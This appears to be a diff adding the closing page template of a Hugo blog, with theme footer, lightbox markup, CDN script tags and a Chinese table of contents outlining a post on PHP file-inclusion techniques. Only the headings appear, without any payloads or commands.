+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 cOOl &#39;s blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#类别">类别</a></li>
+    <li><a href="#包含的相关函数">包含的相关函数</a></li>
+    <li><a href="#利用">利用</a>
+      <ol>
+        <li><a href="#本地敏感文件包含">本地敏感文件包含</a></li>
+        <li><a href="#远程文件包含">远程文件包含</a></li>
+        <li><a href="#伪协议">伪协议</a>
+          <ol>
+            <li><a href="#file">file://</a></li>
+            <li><a href="#php协议">php://协议</a></li>
+            <li><a href="#data协议">data://协议</a></li>
+            <li><a href="#phar协议">phar://协议</a></li>
+            <li><a href="#zip-bzip2-zlib协议">zip://, bzip2://, zlib://协议</a></li>
+            <li><a href="#伪协议总结">伪协议总结</a></li>
+          </ol>
+        </li>
+        <li><a href="#日志文件">日志文件</a></li>
+        <li><a href="#session文件">Session文件</a>
+          <ol>
+            <li><a href="#php中-upload_process-和-session相关配置介绍">PHP中 upload_process 和 session相关配置介绍</a></li>
+            <li><a href="#利用条件">利用条件</a></li>
+            <li><a href="#session路径">session路径</a></li>
+            <li><a href="#利用思路">利用思路</a></li>
+          </ol>
+        </li>
+        <li><a href="#ssh-log">SSH log</a></li>
+        <li><a href="#environ">environ</a></li>
+        <li><a href="#临时文件">临时文件</a></li>
+        <li><a href="#自包含">自包含</a></li>
+        <li><a href="#上传文件崩溃">上传文件+崩溃</a></li>
+      </ol>
+    </li>
+    <li><a href="#总结">总结</a></li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
